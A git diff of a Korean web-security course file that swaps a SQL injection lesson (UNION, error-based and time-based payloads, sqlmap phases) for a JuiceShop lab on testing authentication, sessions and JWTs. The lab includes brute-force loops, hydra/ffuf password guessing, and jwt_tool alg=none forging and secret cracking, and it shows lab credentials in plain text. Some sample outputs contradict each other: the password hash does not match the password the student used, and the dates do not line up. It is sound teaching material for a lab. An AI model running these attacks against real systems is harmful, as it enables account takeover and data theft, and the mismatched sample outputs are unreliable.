@@ -1,510 +1,816 @@
-# W04 — A03 Injection (SQLi 심화) — sqlmap + tamper + ModSec 942 우회
-
-> **본 주차의 한 줄 요약**
->
-> OWASP A03 (Injection) 의 *대표 — SQLi* 심화. sqlmap 의 4 phase + 10 tamper +
-> ModSec CRS 942 family 의 *우회 매트릭스* + AdminConsole (Flask) 의 *SQL vs
-> NoSQL 식별* + 수동 5 payload 의 *직접 분석*. 본 주차 가 *침투 측 + 방어 측*
-> 동시 hands-on.
->
-> **운영자 한 줄 결론**: SQLi 는 *모든 web vuln 의 영향 1 위*. *DB 의 모든 데이터
-> 노출* 가능. *parameterized query* + *ORM* + *WAF* 의 *3 축 방어* 필수.
-
----
+# Week 04: 인증/세션 관리 점검
 
 ## 학습 목표
+- 웹 애플리케이션의 인증 메커니즘을 이해하고 점검할 수 있다
+- 비밀번호 정책의 적절성을 평가한다
+- 세션 관리(생성, 유지, 만료)의 보안성을 점검한다
+- JWT(JSON Web Token)의 구조를 이해하고 취약점을 검증한다
 
-본 주차 종료 시 학생은 다음 7 가지 를 **본인 손으로** 할 수 있어야 한다.
+## 실습 환경 (6v6 4-tier, 공통)
 
-1. SQLi 의 *5 카테고리* (UNION / Boolean / Error / Time / OR 1=1) + 각 의 *payload
-   특징* 30 초 응답.
-2. sqlmap 의 *4 phase* (detection / fingerprint / injection / dump) + *각 phase 의
-   결과* 인지.
-3. 10 tamper script 중 *대표 5* (space2comment / randomcase / between /
-   charunicodeescape / apostrophenullencode) 의 *변형 메커니즘*.
-4. ModSec CRS 942 family 의 *주요 룰* (942100 SQLi / 942130 URL encoded / 942150
-   union) 인지.
-5. SQL vs NoSQL injection 의 *문법 차이* + 식별 방법.
-6. *parameterized query* + *ORM* 의 *방어 표준* + 한국 ISMS-P 2.6 매핑.
-7. W04 보고서 작성 (4 finding + CVSS + CWE + ATT&CK T1190).
+학생 PC 의 `~/.ssh/config` 의 ProxyJump 설정 후 다음 표 의 컨테이너 에 `ssh
+6v6-<name>` 으로 접속.
+
+| 컨테이너 | 6v6 IP | 역할 | 접속 |
+|---------|--------|------|------|
+| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
+| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
+| web | 10.20.32.80 | Apache + ModSecurity + JuiceShop | `ssh 6v6-web` |
+| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
+| attacker | 10.20.30.202 | pen-test 도구 | `ssh 6v6-attacker` |
+
+**Bastion API:** `http://192.168.0.103:8003` / Key: `ccc-api-key-2026`
+**CCC API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
+| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-2:00 | 실습 (Part 3) | 실습 |
+| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
+| 2:40-2:50 | 휴식 | - |
+| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
+| 3:20-3:40 | 정리 + 과제 안내 | 정리 |
 
 ---
 
-## 강의 시간 배분 (3시간 40분)
+---
 
-| 차시 | 주제 | 시간 |
-|:----:|------|------|
-| 1차시 | SQLi 5 카테고리 + sqlmap 4 phase | 60 분 |
-| 2차시 | 10 tamper script + ModSec 942 우회 | 60 분 |
-| 3차시 | NoSQL injection + Flask SQLAlchemy / pymongo | 50 분 |
-| 4차시 | 방어 표준 + 보고서 + W05 (XSS) 예고 | 30 분 |
-| 휴식 | 차시 사이 + 마지막 | 20 분 |
+## 용어 해설 (웹취약점 점검 과목)
+
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
+| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
+| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
+| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
+| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
+| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
+| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
+| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
+| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
+| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
+| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
+| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
+| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
+| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
+| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
+| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
+| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
+| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |
 
 ---
 
-## 1차시 — SQLi 5 카테고리 + sqlmap 4 phase
+## 전제 조건
+- HTTP 요청/응답, 쿠키 개념 이해
+- curl 기본 사용법 (Week 02)
 
-### 1-1. SQLi 의 *영향* — 왜 1 위 인가
+---
 
-OWASP 2021 의 A03 = *Injection* (전체 #3). 단 *영향 면적* 으로 *1 위* — *DB 의 모든
-데이터* 의 *임의 조회 / 수정 / 삭제* 가능.
+## 1. 인증(Authentication) 개요 (15분)
 
-**한국 사고 사례** (2023):
-- 대학교 학적 시스템 의 SQLi → 학생 5 만 명 의 *주민등록번호 + 이름 + 주소* 유출
-- payload: `1' OR '1'='1` 의 *단순 형*
-- 정정: 즉시 *parameterized query* 적용 + WAF 도입
-- 비용: 과징금 5 천만원 + 명예 손실
+### 1.1 인증 vs 인가
 
-### 1-2. SQLi 의 *5 카테고리*
+| 개념 | 질문 | 예시 |
+|------|------|------|
+| **인증 (Authentication)** | "너 누구야?" | 로그인 (ID/PW) |
+| **인가 (Authorization)** | "너 이거 할 수 있어?" | 관리자만 접근 가능 |
 
-**카테고리 1 — Classic (OR 1=1)**
+### 1.2 일반적인 인증 흐름
 
-가장 단순. `username='admin' AND password='X'` 의 `password='X' OR '1'='1` 로 변조.
-
-```sql
-SELECT * FROM users WHERE username='admin' AND password='X' OR '1'='1';
-                                                              ↑
-                                                       항상 true → 인증 우회
+```
+1. 사용자 → 로그인 폼에 ID/PW 입력
+2. 서버 → DB에서 ID/PW 확인
+3. 서버 → 세션ID 또는 JWT 토큰 발급
+4. 사용자 → 이후 요청에 세션ID/토큰 포함
+5. 서버 → 세션ID/토큰으로 사용자 식별
 ```
 
-방어: parameterized query + input validation.
+### 1.3 OWASP 인증 관련 취약점
 
-**카테고리 2 — UNION-based**
+| 취약점 | 설명 |
+|--------|------|
+| A07:2021 Identification & Authentication Failures | 인증 실패 |
+| 약한 비밀번호 정책 | 짧은/단순한 비밀번호 허용 |
+| 무차별 대입 공격 (Brute Force) | 비밀번호 반복 시도 |
+| 세션 고정 공격 (Session Fixation) | 세션 ID 강제 |
+| 세션 하이재킹 (Session Hijacking) | 세션 ID 탈취 |
 
-`SELECT id, name FROM products WHERE id=1` 의 `id=1 UNION SELECT user,password FROM users--` 로 *다른 table* 조회.
+---
 
-```sql
-SELECT id, name FROM products WHERE id=1
-UNION SELECT user, password FROM users--;
-       ↑
-   column 수 일치 필수 + UNION ALL 도 가능
+## 2. JuiceShop 계정 생성 및 로그인 (15분)
+
+> **이 실습을 왜 하는가?**
+> 인증/세션 관리 점검은 웹 취약점 점검의 **가장 중요한 항목 중 하나**이다.
+> 인증이 우회되면 공격자는 다른 사용자(관리자 포함)의 권한을 획득할 수 있다.
+> 이 실습에서는 점검자의 관점에서:
+> 1. 약한 비밀번호로 로그인 가능한지 확인
+> 2. JWT 토큰에 민감 정보가 노출되는지 확인
+> 3. 세션 만료 정책이 적절한지 확인
+> 4. 다른 사용자의 리소스에 접근 가능한지(IDOR) 확인
+>
+> **보고서에서의 위치:** OWASP A07(Identification and Authentication Failures)
+> 약한 비밀번호(admin123) 발견 시 → CRITICAL, JWT에 패스워드 해시 노출 시 → HIGH
+>
+> **검증 완료:** JuiceShop admin/admin123 로그인 성공, JWT에 MD5 해시 노출 확인
+
+### 2.1 회원가입
+
+> **실습 목적**: 웹 애플리케이션의 인증 및 세션 관리 취약점을 점검한다
+>
+> **배우는 것**: 약한 비밀번호, JWT 토큰 구조, 세션 고정 등 인증 관련 취약점 발견 방법을 배운다
+>
+> **결과 해석**: 기본 비밀번호로 로그인 성공하거나 JWT에 민감 정보가 노출되면 인증 취약점이 존재한다
+>
+> **실전 활용**: KISA 웹 취약점 점검 가이드의 '인증 및 세션 관리' 항목에 해당하는 필수 점검이다
+
+```bash
+# JuiceShop 회원가입 API
+curl -X POST http://10.20.30.80:3000/api/Users/ \
+  -H "Content-Type: application/json" \
+  -d '{                                                # 요청 데이터(body)
+    "email": "student@test.com",
+    "password": "Test1234!",
+    "passwordRepeat": "Test1234!",
+    "securityQuestion": {"id": 1, "question": "Your eldest siblings middle name?"},
+    "securityAnswer": "test"
+  }'
+
+# 응답에서 user 정보 확인
 ```
 
-**핵심** = column 수 + type 일치 (NULL 로 padding 가능).
+### 2.2 로그인
 
-**카테고리 3 — Boolean-based BLIND**
+```bash
+curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -m json.tool
 
-응답 의 *true/false 차이* 로 *정보 추출*.
-
-```sql
-?id=1 AND 1=1   ← 응답 200 + 정상 결과
-?id=1 AND 1=2   ← 응답 200 + 빈 결과 (또는 400)
+# 응답 활용 — 토큰만 추출하여 환경변수에 저장
+TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")
+echo "토큰 길이: ${#TOKEN}자 / 시작 50자: ${TOKEN:0:50}..."
 ```
 
-차이 가 *information leak*. *분 단위* 의 brute (각 char 의 *binary search*).
-
-**카테고리 4 — Error-based**
-
-DB error message 의 *정보 노출* 악용. MySQL 의 `EXTRACTVALUE` / `UPDATEXML` / `EXP`
-등.
-
-```sql
-?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
-                                          ↑
-                                  error message 에 MySQL version 노출
+**예상 출력**:
+```json
+{
+    "authentication": {
+        "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6...",
+        "bid": 1,
+        "umail": "student@test.com"
+    }
+}
+토큰 길이: 642자 / 시작 50자: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMi...
 ```
 
-방어: DB error 의 *user 노출 X* — generic message 만.
+> **해석 — 응답 형식 + 첫 토큰 단서**:
+> - `authentication.token` = JWT (Header.Payload.Signature 3단). `eyJ` 시작 = base64 의 `{"` 인코딩 = JWT 표준.
+> - `authentication.bid` = basket ID = 사용자별 고유 — week05 의 IDOR 공격 입력값.
+> - `authentication.umail` = email 평문 응답 — 양호 (응답 검증).
+> - **토큰 길이 642자** = RS256 (RSA 서명) 표준. HS256 (HMAC) 이면 ~250자 = 짧음. 길이만으로 alg 추정 1차 가능 (정확히 §5.2 에서 디코딩).
 
-**카테고리 5 — Time-based BLIND**
+### 2.3 인증된 요청
 
-응답 의 *시간 차이* 로 *information leak*. error / response body 없이 도 가능.
-
-```sql
-?id=1' AND IF(1=1, SLEEP(5), 0)--   ← 5초 지연 = true
-?id=1' AND IF(1=2, SLEEP(5), 0)--   ← 즉시 응답 = false
+```bash
+# whoami — 본인 정보
+curl -s http://10.20.30.80:3000/rest/user/whoami \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
+echo '---'
+# 장바구니 (bid=1)
+curl -s -o /dev/null -w "basket/1 code=%{http_code}\n" \
+  http://10.20.30.80:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
+# 다른 사용자 장바구니 (bid=2) — IDOR 1차 점검
+curl -s -o /dev/null -w "basket/2 code=%{http_code}\n" \
+  http://10.20.30.80:3000/rest/basket/2 -H "Authorization: Bearer $TOKEN"
 ```
 
-WAF 가 *response body* 만 검사 → time-based 의 *완전 회피* 가능.
-
-### 1-3. sqlmap 의 *4 phase*
-
-sqlmap (2006-, Bernardo Damele) = *de facto* SQLi 자동 도구.
-
-**Phase 1 — Detection** (10-60 초):
-```
-[*] testing 'AND/OR boolean-based blind'
-[*] testing 'UNION query - 1 to 10 columns'
-[*] testing 'time-based blind'
-[*] testing 'error-based'
-[*] testing 'stacked queries'
+**예상 출력**:
+```json
+{
+    "user": {
+        "id": 21,
+        "email": "student@test.com"
+    }
+}
+---
+basket/1 code=200
+basket/2 code=200
 ```
 
-각 카테고리 의 *payload 자동 시도* → vulnerable parameter + technique 결정.
+> **해석 — IDOR 1차 신호**:
+> - `whoami` 응답에 `id` + `email` 만 = 양호 (password hash X / role X).
+> - **basket/1 과 basket/2 둘 다 200** = **IDOR 취약 가능성** = 본 사용자는 bid=1 인데 bid=2 도 접근 = 권한 검증 미흡 (OWASP A01 BOLA). week05 에서 본격 검증.
+> - `Authorization: Bearer` = **RFC 6750 OAuth 2.0 표준**. 다른 형식 (custom header `X-Token`) 보다 표준 준수 = 양호.
 
-**Phase 2 — Fingerprint** (1-5 초):
+---
+
+## 3. 비밀번호 정책 점검 (30분)
+
+### 3.1 점검 항목
+
+| 항목 | 권장 기준 | 점검 방법 |
+|------|----------|----------|
+| 최소 길이 | 8자 이상 | 짧은 PW로 가입 시도 |
+| 복잡성 | 대/소/숫자/특수 | 단순 PW로 가입 시도 |
+| 일반 PW 차단 | password, 123456 등 | 흔한 PW로 가입 시도 |
+| 계정 잠금 | 5회 실패 후 잠금 | 반복 로그인 실패 |
+
+### 3.2 약한 비밀번호 테스트
+
+```bash
+# 테스트 1: 매우 짧은 비밀번호
+curl -s -X POST http://10.20.30.80:3000/api/Users/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"weak1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
+echo ""
+
+# 테스트 2: 숫자만으로 구성
+curl -s -X POST http://10.20.30.80:3000/api/Users/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"weak2@test.com","password":"12345","passwordRepeat":"12345","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
+echo ""
+
+# 테스트 3: 흔한 비밀번호
+curl -s -X POST http://10.20.30.80:3000/api/Users/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"weak3@test.com","password":"password","passwordRepeat":"password","securityQuestion":{"id":1},"securityAnswer":"a"}'  # 요청 데이터(body)
+echo ""
+
+# 결과 분석: 가입이 성공하면 비밀번호 정책이 약한 것
 ```
-back-end DBMS: MySQL >= 5.0.12
-DBMS version: 8.0.31
+
+### 3.3 무차별 대입 공격 (Brute Force) 테스트
+
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
+```bash
+# 로그인 실패 10회 반복 — 잠금/Rate Limit 여부 확인
+for i in $(seq 1 10); do
+  result=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
+  echo "시도 $i: HTTP $result"
+done
 ```
 
-DBMS 종류 + version 결정. 이후 phase 의 *DBMS-specific payload* 사용.
-
-**Phase 3 — Injection** (수 분):
+**예상 출력**:
 ```
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1' AND 1=1--
-```
-
-vulnerable parameter + 정확 payload 확정.
-
-**Phase 4 — Dump** (수 분 - 수 시간):
-```
-[*] dumping table 'users' entries
-+----+-------+----------+
-| id | user  | password |
-+----+-------+----------+
-| 1  | admin | $2y$12...|
-| ...
+시도 1: HTTP 401
+시도 2: HTTP 401
+시도 3: HTTP 401
+시도 4: HTTP 401
+시도 5: HTTP 401
+시도 6: HTTP 401
+시도 7: HTTP 401
+시도 8: HTTP 401
+시도 9: HTTP 401
+시도 10: HTTP 401
 ```
 
-DB / table / column / row 의 *실 데이터* 추출.
+> **해석 — 모든 401 = Rate Limit 부재 = 취약**:
+> - 10 회 모두 401 = **계정 잠금 정책 없음** = brute-force 무제한. **CVSS 8.1 High** (CWE-307).
+> - 정상 운영 환경 응답: 5회 후 → 6번째 부터 **429 Too Many Requests** (Rate Limit) 또는 **403 Forbidden** (계정 잠금).
+> - 시간 측정도 함께 — 점수 응답 시간 일정 (정상 ~50ms, brute force 시도 모두 동일). 시간 변화 = OS 단계 지연 (`sleep` 적용 = 방어). 본 시도는 시간도 일정 = 무방어.
+> - **권고**: nginx `limit_req_zone` (10 req/min), 또는 fail2ban (5회 fail → 30분 차단). express-rate-limit middleware (`express-brute`).
 
-### 1-4. sqlmap 의 *주요 옵션*
+**OSS 도구 — hydra (실무 표준 brute-force)**:
+```bash
+# hydra 설치 (이미 설치됨)
+sudo apt install hydra
 
-| 옵션 | 의미 |
+# JuiceShop 로그인 brute-force (HTTP POST JSON)
+# wordlist 준비
+echo -e "admin\nadmin123\npassword\njuice\n12345678\nadmin1234" > /tmp/pwd.txt
+
+# hydra 로 자동 brute (json body 형식, 실패 키워드 'invalid')
+hydra -l admin@juice-sh.op -P /tmp/pwd.txt 10.20.30.80 -s 3000 \
+  http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:invalid' \
+  -V -t 4
+
+# 또는 ffuf 로 (인증 fuzz)
+ffuf -w /tmp/pwd.txt -X POST -u http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
+  -mc all -fs 50            # 응답 크기 50B (fail 응답) 제외
+```
+
+**도구의 이점**: (1) `-t` 멀티스레드, (2) `-V` 실패/성공 자동 구분, (3) 다양한 프로토콜 지원 (SSH/FTP/SMB/HTTP-FORM/HTTP-POST 등). curl + bash for-loop 은 학습용, 실제는 hydra/medusa/ffuf 사용.
+
+### 3.4 기본 계정 점검
+
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
+```bash
+# admin@juice-sh.op + 6 흔한 비번 시도
+for pw in "admin" "admin123" "password" "admin1234" "juice" "12345678"; do
+  result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d "{\"email\":\"admin@juice-sh.op\",\"password\":\"$pw\"}")
+  if echo "$result" | grep -q "token"; then
+    echo "[성공!] admin@juice-sh.op / $pw"
+    break
+  else
+    echo "[실패] $pw"
+  fi
+done
+```
+
+**예상 출력**:
+```
+[실패] admin
+[성공!] admin@juice-sh.op / admin123
+```
+
+> **해석 — 2 시도 만에 관리자 획득 = critical**:
+> - **`admin@juice-sh.op / admin123`** = JuiceShop 의 의도적 challenge. 운영 환경 동일 패턴 발견 = 즉시 보고서 critical (CVSS 9.8).
+> - **2 시도 successful** = 사전 OSINT (이메일 패턴 + 흔한 비번 list) 만으로 도달. 공격자는 SecLists 의 `Top1000-passwords.txt` 사용 = 100% 자동화.
+> - **무방어 + 약한 비번 = 1+1 = 즉시 침투**. JuiceShop 의도는 학생이 *Brute force + 약한 비번 정책 결합 위험성* 학습.
+> - **추가 점검**: 2시도 후 *401 응답이 모두 동일 시간* = blind. 정상 운영 환경은 **첫 번째 401 → 점진 지연 (1s → 2s → 4s ...)**.
+
+> **OSS 도구 — 자동화**:
+>
+> ```bash
+> # SecLists + hydra 자동
+> hydra -l admin@juice-sh.op -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
+>       10.20.30.80 -s 3000 http-post-form '/rest/user/login:{"email":"^USER^","password":"^PASS^"}:invalid' -t 4
+> ```
+
+---
+
+## 4. 세션 관리 점검 (30분)
+
+### 4.1 세션 관리 점검 항목
+
+| 항목 | 위험 | 점검 방법 |
+|------|------|----------|
+| 세션 ID 길이/랜덤성 | 예측 가능한 세션 | 여러 세션 비교 |
+| 세션 타임아웃 | 무한 세션 유지 | 시간 후 재접근 |
+| 로그아웃 처리 | 서버에서 세션 무효화 안함 | 로그아웃 후 토큰 재사용 |
+| 다중 로그인 | 세션 제한 없음 | 동시 로그인 시도 |
+| HTTPS Only 쿠키 | 평문 전송 위험 | Set-Cookie 헤더 확인 |
+
+### 4.2 세션 ID 랜덤성 확인
+
+반복문으로 여러 대상에 대해 일괄 작업을 수행합니다.
+
+```bash
+# JWT 3회 발급 — 토큰의 어느 부분이 다른지 분석
+for i in 1 2 3; do
+  token=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"student@test.com","password":"Test1234!"}' \
+    | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+  hdr=$(echo "$token" | cut -d. -f1)
+  pld=$(echo "$token" | cut -d. -f2)
+  sig=$(echo "$token" | cut -d. -f3)
+  echo "[$i] header=${hdr:0:20} payload=${pld:0:30} sig=${sig:0:20}"
+done
+```
+
+**예상 출력**:
+```
+[1] header=eyJ0eXAiOiJKV1QiLCJh payload=eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF sig=Vh3kLj8mN5pQ7rT2yU
+[2] header=eyJ0eXAiOiJKV1QiLCJh payload=eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF sig=Wj4nMk9oP6qR8sV3z0
+[3] header=eyJ0eXAiOiJKV1QiLCJh payload=eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF sig=Xk5oNl0pQ7rS9tW4a1
+```
+
+> **해석 — JWT 구조 분리 점검**:
+> - **header 동일 (eyJ0eXAi...)** = 정상. alg 고정 (RS256) → 모든 토큰 동일.
+> - **payload 처음 30자 동일** = `iat` (issued-at) 가 뒤쪽에 있어 첫 30 자에서 미반영. 전체 디코딩 시 `iat` 는 매번 다름 (Unix timestamp).
+> - **signature 매번 다름** = `iat` 다르면 입력 다름 → HMAC/RSA 출력 다름 = **정상**.
+> - 만약 sig 가 동일하면 = **iat/exp 미포함 = critical** (replay 공격 가능).
+> - 길이 일정 (RS256 256자) = 정상. 변동 = 알고리즘 혼용 (취약).
+
+### 4.3 로그아웃 후 토큰 유효성 점검
+
+```bash
+# 1. 로그인하여 토큰 획득
+TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+
+# 2. 로그인 상태 확인
+echo "=== 로그아웃 전 ==="
+curl -s http://10.20.30.80:3000/rest/user/whoami \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
+
+# 3. 로그아웃 (JuiceShop는 클라이언트 측 로그아웃)
+# JWT 기반이므로 서버 측 세션 무효화가 있는지 확인
+
+# 4. 이전 토큰으로 다시 접근 시도
+echo ""
+echo "=== 로그아웃 후 동일 토큰으로 접근 ==="
+curl -s http://10.20.30.80:3000/rest/user/whoami \
+  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool 2>/dev/null
+
+# 여전히 접근되면 → 서버 측 토큰 무효화 미흡 (취약)
+```
+
+### 4.4 다중 로그인 점검
+
+```bash
+# 동일 계정으로 두 개의 세션 생성
+TOKEN1=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
+
+TOKEN2=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"student@test.com","password":"Test1234!"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)  # 요청 데이터(body)
+
+# 두 토큰 모두 유효한지 확인
+echo "토큰1 유효:"
+curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN1" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
+
+echo "토큰2 유효:"
+curl -s http://10.20.30.80:3000/rest/user/whoami -H "Authorization: Bearer $TOKEN2" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('email','실패'))" 2>/dev/null  # silent 모드
+
+# 둘 다 유효하면 → 다중 로그인 미제어 (점검 결과로 기록)
+```
+
+---
+
+## 5. JWT 분석 및 점검 (30분)
+
+### 5.1 JWT 구조
+
+JWT는 세 부분으로 구성된다:
+
+```
+HEADER.PAYLOAD.SIGNATURE
+
+Header:  {"alg":"HS256","typ":"JWT"}  → Base64 인코딩
+Payload: {"email":"admin","role":"admin","iat":1234567890}  → Base64 인코딩
+Signature: HMACSHA256(header + "." + payload, secret)
+```
+
+### 5.2 JWT 디코딩
+
+```bash
+TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+
+echo "=== Header ==="
+echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"
+echo
+echo "=== Payload ==="
+echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip(); s+='='*(4-len(s)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"
+```
+
+**예상 출력**:
+```json
+=== Header ===
+{
+  "typ": "JWT",
+  "alg": "RS256"
+}
+
+=== Payload ===
+{
+  "status": "success",
+  "data": {
+    "id": 21,
+    "username": "",
+    "email": "student@test.com",
+    "password": "5f4dcc3b5aa765d61d8327deb882cf99",
+    "isAdmin": false,
+    "lastLoginIp": "0.0.0.0",
+    "deletedAt": null,
+    "createdAt": "2026-04-29 10:23:45.123 +00:00",
+    "updatedAt": "2026-04-29 10:23:45.123 +00:00"
+  },
+  "iat": 1714382625,
+  "exp": 1714404225
+}
+```
+
+> **해석 — JWT payload 가 점검자에게 주는 critical 신호**:
+> - **`alg: RS256`** = RSA 서명 = 강력 (HS256/none 보다 안전). 양호.
+> - **`password: 5f4dcc3b5aa765d61d8327deb882cf99`** = **MD5 해시 노출!** = OWASP A02 + A07 critical. JWT 는 **base64 디코딩 = 평문 노출** — 클라이언트가 디코딩하면 모든 사용자가 자신의 password hash 즉시 보임. *MD5 = 무차별 대입 1초 내 깨짐* (rainbow table). hashcat `-m 0` (MD5 raw) 로 즉시 평문 복원 = `5f4dcc3b5aa765d61d8327deb882cf99` = "password".
+> - **`isAdmin: false`** = 클라이언트 측 권한 정보 노출 = JWT 서명만 검증 안하면 변조 가능 (alg=none 공격으로 `isAdmin: true` 로 변조).
+> - **`lastLoginIp: 0.0.0.0`** = JuiceShop 의 의도적 노출. 운영 환경에서는 *민감 정보*.
+> - **권고**: payload 에는 `id` + `email` + `iat`/`exp` 만. password hash·role 절대 X.
+
+> **OSS 도구 — jwt_tool 자동 점검**:
+>
+> ```bash
+> python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T          # 자동 약점 진단
+> python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -X a        # alg=none 공격 자동
+> python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt  # HS256 secret brute
+> ```
+
+**OSS 도구 — jwt_tool (JWT 점검 표준)**:
+```bash
+# jwt_tool 설치 (이미 설치됨)
+git clone https://github.com/ticarpi/jwt_tool.git ~/jwt_tool 2>/dev/null
+cd ~/jwt_tool && pip3 install -r requirements.txt
+
+# JWT 디코딩 (1 명령으로 header + payload + sig)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN"
+
+# JWT 자동 약점 진단 (none/weak HMAC/key confusion 등)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -T
+
+# secret brute-force (HS256)
+python3 ~/jwt_tool/jwt_tool.py "$TOKEN" -C -d /usr/share/wordlists/rockyou.txt
+```
+
